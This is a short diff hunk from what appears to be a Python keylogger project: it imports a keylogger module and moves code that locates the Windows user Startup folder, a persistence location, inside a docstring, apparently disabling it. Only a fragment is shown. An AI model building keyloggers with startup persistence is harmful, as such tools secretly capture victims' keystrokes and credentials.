@@ -3,11 +3,15 @@ from keyloggerskill import keylogger
 import time
 import threading
 from keystroke import main
-import shutil
-import os
-name = os.getlogin()
+
 
 """
+import shutil
+import os
+
+name = os.getlogin()
+
+
 try:
     target = "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(name)
 
